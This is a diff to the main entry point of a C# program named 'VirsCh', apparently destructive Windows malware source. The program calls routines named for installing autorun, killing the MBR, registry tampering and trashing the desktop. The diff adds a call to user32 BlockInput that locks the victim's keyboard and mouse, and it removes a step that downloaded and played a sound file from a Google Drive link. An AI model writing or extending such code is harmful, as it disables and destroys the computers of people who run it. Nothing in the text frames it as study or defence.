@@ -1,11 +1,13 @@
-﻿using System.IO;
-using System.Media;
+﻿using System.Runtime.InteropServices;
 using System.Threading;
 
 namespace VirsCh
 {
     static class Program
     {
+        [DllImport("user32.dll")]
+        private static extern bool BlockInput(bool block);
+
         static void Main()
         {
 
@@ -13,19 +15,7 @@ namespace VirsCh
                 Addition.InstallAR();
             Killer.MBR();
             Addition.RegFun();
-
-            if (File.Exists(@"C:\Users\Public\Downloads\BG.wav"))
-            {
-                SoundPlayer back_snd = new SoundPlayer(@"C:\Users\Public\Downloads\BG.wav");
-                back_snd.Play();
-            } else
-            {
-                Misc.DownloadFileUrl("https://drive.google.com/uc?export=download&id=1hEGfM2a3CI__Zb1E9ra9o-Rk4UB_VG4J",
-                "C:\\Users\\Public\\Downloads\\BG.wav");
-                SoundPlayer back_snd = new SoundPlayer(@"C:\Users\Public\Downloads\BG.wav");
-                back_snd.Play();
-            }
-
+            BlockInput(true);
             var rule = new Rules();
             new Thread(() => rule.ShowDialog()).Start();
             new Thread(() => Addition.TrashDestop()).Start();
